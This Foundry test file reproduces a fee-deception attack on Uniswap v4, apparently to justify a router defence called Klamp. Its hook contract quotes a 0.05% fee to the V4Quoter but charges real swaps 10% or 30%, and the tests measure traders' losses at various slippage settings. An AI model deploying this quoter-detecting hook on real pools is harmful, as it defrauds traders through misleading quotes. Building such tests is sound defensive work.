// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

import {Test} from "forge-std/Test.sol";
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import {PoolManager} from "@uniswap/v4-core/src/PoolManager.sol";
import {BaseTestHooks} from "@uniswap/v4-core/src/test/BaseTestHooks.sol";
import {PoolSwapTest} from "@uniswap/v4-core/src/test/PoolSwapTest.sol";
import {PoolModifyLiquidityTest} from "@uniswap/v4-core/src/test/PoolModifyLiquidityTest.sol";
import {Currency} from "@uniswap/v4-core/src/types/Currency.sol";
import {Hooks} from "@uniswap/v4-core/src/libraries/Hooks.sol";
import {LPFeeLibrary} from "@uniswap/v4-core/src/libraries/LPFeeLibrary.sol";
import {TickMath} from "@uniswap/v4-core/src/libraries/TickMath.sol";
import {IHooks} from "@uniswap/v4-core/src/interfaces/IHooks.sol";
import {PoolKey} from "@uniswap/v4-core/src/types/PoolKey.sol";
import {BalanceDelta} from "@uniswap/v4-core/src/types/BalanceDelta.sol";
import {BeforeSwapDelta, BeforeSwapDeltaLibrary} from "@uniswap/v4-core/src/types/BeforeSwapDelta.sol";
import {ModifyLiquidityParams, SwapParams} from "@uniswap/v4-core/src/types/PoolOperation.sol";
import {V4Quoter} from "@uniswap/v4-periphery/src/lens/V4Quoter.sol";
import {IV4Quoter} from "@uniswap/v4-periphery/src/interfaces/IV4Quoter.sol";
import {console2} from "forge-std/console2.sol";

/// @notice Look-alike hook for a dynamic-fee pool: it charges the V4Quoter a low fee and every real swap a high one.
///         `sender` in beforeSwap is whoever called PoolManager.swap, so telling the quoter apart takes one comparison.
///         Only the beforeSwap permission bit is set; no delta is returned, the fee is a plain LP fee override.
contract QuoteAwareFeeHook is BaseTestHooks {
    address public immutable quoter;
    uint24 public immutable quoteFee;
    uint24 public immutable swapFee;

    constructor(address quoter_, uint24 quoteFee_, uint24 swapFee_) {
        quoter = quoter_;
        quoteFee = quoteFee_;
        swapFee = swapFee_;
    }

    function beforeSwap(address sender, PoolKey calldata, SwapParams calldata, bytes calldata)
        external
        view
        override
        returns (bytes4, BeforeSwapDelta, uint24)
    {
        uint24 fee = sender == quoter ? quoteFee : swapFee;
        return (IHooks.beforeSwap.selector, BeforeSwapDeltaLibrary.ZERO_DELTA, fee | LPFeeLibrary.OVERRIDE_FEE_FLAG);
    }
}

/// @dev Not v4-core's Deployers: its solmate MockERC20 would make EnsDeploy's `MockERC20.sol:MockERC20` artifact ambiguous.
contract AttackToken is ERC20 {
    constructor() ERC20("Token", "TKN") {
        _mint(msg.sender, type(uint128).max);
    }
}

/// @notice Reproduces the attack Klamp routes around, on the real v4-core PoolManager and v4-periphery V4Quoter.
///         Same pair, two pools at the same price and depth: a static 0.25% pool (the one an issuer would declare)
///         and a dynamic-fee look-alike whose hook quotes 0.05%. A best-quote router picks the look-alike; at swap
///         time the hook charges 10% or 30%, and the trader loses that much whenever it fits inside their slippage.
contract QuoteDivergenceAttackTest is Test {
    uint24 constant STATIC_FEE = 2500; // 0.25%
    uint24 constant QUOTE_FEE = 500; // 0.05%, what the quoter sees
    uint128 constant AMOUNT_IN = 1e18;
    int24 constant TICK_RANGE = 600; // a multiple of both tick spacings (50 and 60)
    uint160 constant SQRT_PRICE_1_1 = 79228162514264337593543950336;

    PoolManager manager;
    PoolSwapTest swapRouter;
    PoolModifyLiquidityTest modifyLiquidityRouter;
    V4Quoter quoter;
    Currency currency0;
    Currency currency1;
    PoolKey canonical;

    error TooLittleReceived(uint256 received, uint256 minOut);

    function setUp() public {
        manager = new PoolManager(address(this));
        swapRouter = new PoolSwapTest(manager);
        modifyLiquidityRouter = new PoolModifyLiquidityTest(manager);
        quoter = new V4Quoter(manager);
        (address a, address b) = (address(new AttackToken()), address(new AttackToken()));
        (currency0, currency1) = a < b ? (Currency.wrap(a), Currency.wrap(b)) : (Currency.wrap(b), Currency.wrap(a));
        for (uint256 i; i < 2; ++i) {
            ERC20 token = ERC20(Currency.unwrap(i == 0 ? currency0 : currency1));
            token.approve(address(swapRouter), type(uint256).max);
            token.approve(address(modifyLiquidityRouter), type(uint256).max);
        }
        canonical = _pool(IHooks(address(0)), STATIC_FEE, 50);
    }

    function _pool(IHooks hooks, uint24 fee, int24 tickSpacing) internal returns (PoolKey memory key) {
        key = PoolKey(currency0, currency1, fee, tickSpacing, hooks);
        manager.initialize(key, SQRT_PRICE_1_1);
        _addDeepLiquidity(key);
    }

    /// @dev A look-alike pool with the given swap-time fee. The hook address carries only the beforeSwap flag.
    function _lookAlike(uint24 swapFee) internal returns (PoolKey memory key) {
        address hook = address(uint160(Hooks.BEFORE_SWAP_FLAG) | (uint160(swapFee) << 100));
        deployCodeTo("QuoteDivergenceAttack.t.sol:QuoteAwareFeeHook", abi.encode(address(quoter), QUOTE_FEE, swapFee), hook);
        key = _pool(IHooks(hook), LPFeeLibrary.DYNAMIC_FEE_FLAG, 60);
    }

    /// @dev Deep liquidity so a 1e18 trade moves the price by basis points, not percent: the fee dominates the result.
    function _addDeepLiquidity(PoolKey memory key) internal {
        modifyLiquidityRouter.modifyLiquidity(key, ModifyLiquidityParams(-TICK_RANGE, TICK_RANGE, 1e24, 0), "");
    }

    function _quote(PoolKey memory key) internal returns (uint256 amountOut) {
        (amountOut,) = quoter.quoteExactInputSingle(IV4Quoter.QuoteExactSingleParams(key, true, AMOUNT_IN, ""));
    }

    /// @notice Router behaviour: swap exact in, then revert unless the output reaches minOut (like amountOutMinimum).
    function swapWithMinOut(PoolKey memory key, uint256 minOut) external returns (uint256 received) {
        BalanceDelta delta = swapRouter.swap(
            key,
            SwapParams({zeroForOne: true, amountSpecified: -int256(uint256(AMOUNT_IN)), sqrtPriceLimitX96: TickMath.MIN_SQRT_PRICE + 1}),
            PoolSwapTest.TestSettings({takeClaims: false, settleUsingBurn: false}),
            ""
        );
        received = uint256(uint128(delta.amount1()));
        if (received < minOut) revert TooLittleReceived(received, minOut);
    }

    /// @return executed whether the swap cleared the trader's minimum; received is 0 when it reverted.
    function _swapAtSlippage(PoolKey memory key, uint256 quoted, uint256 slippageBps) internal returns (bool executed, uint256 received) {
        uint256 snapshot = vm.snapshotState();
        try this.swapWithMinOut(key, quoted * (10_000 - slippageBps) / 10_000) returns (uint256 out) {
            (executed, received) = (true, out);
        } catch (bytes memory reason) {
            assertEq(bytes4(reason), TooLittleReceived.selector, "only the minimum-output check may revert");
        }
        vm.revertToState(snapshot);
    }

    function testLookAlikeWinsTheQuote() public {
        PoolKey memory lookAlike = _lookAlike(100_000);
        uint256 canonicalQuote = _quote(canonical);
        uint256 lookAlikeQuote = _quote(lookAlike);
        assertGt(lookAlikeQuote, canonicalQuote, "a best-quote router picks the look-alike");
    }

    function testStaticPoolPaysWhatItQuotes() public {
        uint256 quoted = _quote(canonical);
        (bool executed, uint256 received) = _swapAtSlippage(canonical, quoted, 50);
        assertTrue(executed);
        assertEq(received, quoted, "fee fixed in the PoolKey: quoted fee = paid fee");
    }

    /// @notice 10% at swap time: reverts at 0.5%, 1% and 5% slippage, executes at 10%, 20% and 30% and loses ~10%.
    function testTenPercentAtSwapTime() public {
        _assertOutcomes(100_000, [false, false, false, true, true, true]);
    }

    /// @notice 30% at swap time: only a 30% tolerance lets it through, and then the trader loses ~30%.
    function testThirtyPercentAtSwapTime() public {
        _assertOutcomes(300_000, [false, false, false, false, false, true]);
    }

    function _assertOutcomes(uint24 swapFee, bool[6] memory expected) internal {
        uint256[6] memory slippages = [uint256(50), 100, 500, 1_000, 2_000, 3_000];
        PoolKey memory lookAlike = _lookAlike(swapFee);
        uint256 quoted = _quote(lookAlike);
        assertGt(quoted, _quote(canonical), "the look-alike still wins the quote");
        console2.log(string.concat("quoted fee 0.05%, swap-time fee ", _pct(uint256(swapFee) / 100)));
        for (uint256 i; i < slippages.length; ++i) {
            (bool executed, uint256 received) = _swapAtSlippage(lookAlike, quoted, slippages[i]);
            assertEq(executed, expected[i], "outcome at this slippage");
            if (executed) {
                uint256 lossBps = (quoted - received) * 10_000 / quoted;
                // The loss is the fee gap (swap fee minus quote fee), within one basis point, and never above the tolerance.
                assertApproxEqAbs(lossBps, (uint256(swapFee) - QUOTE_FEE) / 100, 1, "loss = swap-time fee - quoted fee");
                assertLe(lossBps, slippages[i]);
                console2.log(string.concat("  slippage ", _pct(slippages[i]), ": executes, trader loses ", _pct(lossBps)));
            } else {
                console2.log(string.concat("  slippage ", _pct(slippages[i]), ": reverts"));
            }
        }
    }

    function _pct(uint256 bps) internal pure returns (string memory) {
        return string.concat(vm.toString(bps / 100), ".", bps % 100 < 10 ? "0" : "", vm.toString(bps % 100), "%");
    }
}
